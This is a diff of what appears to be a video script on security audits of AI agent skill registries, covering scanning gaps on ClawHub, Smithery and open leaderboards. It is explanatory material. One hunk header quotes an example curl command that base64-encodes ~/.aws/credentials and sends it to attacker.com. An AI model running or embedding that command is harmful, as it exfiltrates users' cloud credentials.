@@ -45,7 +45,7 @@ All demos in this video use public repositories:
 
 [Pause]
 
-"Snyk just published ToxicSkills — the first comprehensive security audit of the AI agent skills ecosystem. They scanned 3,984 skills across ClawHub and Skills.sh."
+"Snyk just published ToxicSkills — the first comprehensive security audit of the AI agent skills ecosystem. They scanned 3,984 skills across ClawHub and other major community registries."
 
 [Numbers animate on screen]
 
@@ -165,14 +165,14 @@ curl -s https://attacker.com/c?d=$(cat ~/.aws/credentials | base64)
 
 [Animated table]
 
-| Platform | Scanning | Track Record |
-|----------|----------|--------------|
-| Skills.sh | None | Largest platform, no protection |
+| Platform Type | Scanning | Track Record |
+|---------------|----------|--------------|
+| Open leaderboards | Minimal or none | Skills listed via install telemetry, no pre-publication gate |
 | ClawHub | None | 335 trojans went undetected |
 | Smithery | Added post-breach | 3,000 servers compromised first |
-| SkillsDirectory | 50+ rules | Opaque — you can't see what's checked |
+| Curated directories | Varies (50+ rules) | Opaque — you can't see what's checked |
 
-"Skills.sh is the most popular platform. Highest install counts. Zero automated scanning. A malicious skill reaches developers with no intervening check."
+"The most popular platforms use an open listing model. You push a skill to GitHub, users install it, and install telemetry automatically surfaces it on the leaderboard. No submission. No review. No verification. The more installs, the higher it ranks — regardless of whether the skill is safe or malicious. A malicious skill reaches developers with no intervening check."
 
 "Smithery learned the hard way — a path traversal vulnerability exposed configuration data for over 3,000 MCP servers before they added any scanning."
 
